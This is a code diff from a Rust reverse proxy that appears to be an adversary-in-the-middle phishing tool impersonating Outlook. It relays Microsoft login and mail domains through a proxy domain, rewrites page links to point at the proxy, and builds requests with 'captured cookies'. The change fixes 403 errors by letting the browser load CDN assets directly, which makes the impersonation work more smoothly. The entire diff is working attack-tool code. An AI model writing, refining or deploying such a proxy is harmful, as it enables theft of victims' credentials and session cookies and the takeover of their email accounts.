@@ -9,17 +9,22 @@ use crate::proxy_security::{log_request, is_ip_allowed, add_security_headers};
 const TARGET_DOMAIN: &str = "outlook.live.com";
 const TARGET_URL: &str = "https://outlook.live.com";
 
-// Other Microsoft domains that need to be proxied
-const MICROSOFT_DOMAINS: &[&str] = &[
+// Domains that should be proxied (authentication and API endpoints)
+// CDN resources are NOT proxied to avoid 403 Access Denied
+const PROXY_DOMAINS: &[&str] = &[
     "outlook.live.com",
     "outlook.office.com",
     "outlook.office365.com",
-    "res.public.onecdn.static.microsoft",
-    "res-1.cdn.office.net",
     "login.microsoftonline.com",
     "webshell.suite.office.net",
     "wwdb.webshell.suite.office.net",
     "eudb.webshell.suite.office.net",
+];
+
+// CDN domains that should NOT be proxied (browser loads directly)
+const CDN_DOMAINS: &[&str] = &[
+    "res.public.onecdn.static.microsoft",
+    "res-1.cdn.office.net",
     "content.lifecycle.office.net",
     "exo.nel.measure.office.net",
     "ad.doubleclick.net",
@@ -154,21 +159,18 @@ pub async fn proxy_handler(
         None
     };
     
-    // Map proxy paths to real Microsoft domains and paths
-    let (microsoft_domain, microsoft_path) = if path.starts_with("/s/") {
+    // Map proxy paths to real Microsoft paths
+    let microsoft_path = if path.starts_with("/s/") {
         // Session paths map to Outlook mail
-        ("outlook.live.com", "/mail/")
-    } else if path.starts_with("/owamail/") || path.starts_with("/assets/") {
-        // CDN resources
-        ("res.public.onecdn.static.microsoft", path)
+        "/mail/"
     } else if path == "/" || path == "/owa/" {
-        ("outlook.live.com", "/owa/")
+        "/owa/"
     } else {
-        ("outlook.live.com", path)
+        path
     };
     
     // Build target URL
-    let target_url = format!("https://{}{}", microsoft_domain, microsoft_path);
+    let target_url = format!("https://{}{}", config.target_domain, microsoft_path);
     
     // Build proxy headers with captured cookies
     let mut headers = build_proxy_headers(&req, config);
@@ -370,27 +372,27 @@ pub async fn proxy_handler(
     response
 }
 
-/// Rewrite all Microsoft domains in content
+/// Rewrite only proxy domains (not CDN domains to avoid 403 errors)
 fn rewrite_microsoft_domains(content: &str, proxy_domain: &str) -> String {
     let mut rewritten = content.to_string();
     
-    for domain in MICROSOFT_DOMAINS {
-        // Replace https://domain with https://proxy
+    // Only rewrite domains that should be proxied
+    for domain in PROXY_DOMAINS {
         rewritten = rewritten.replace(
             &format!("https://{}", domain),
             &format!("https://{}", proxy_domain),
         );
-        // Replace http://domain with https://proxy
         rewritten = rewritten.replace(
             &format!("http://{}", domain),
             &format!("https://{}", proxy_domain),
         );
-        // Replace protocol-relative //domain with //proxy
         rewritten = rewritten.replace(
             &format!("//{}", domain),
             &format!("//{}", proxy_domain),
         );
     }
+    
+    // Do NOT rewrite CDN domains - browser loads them directly
     
     rewritten
 }
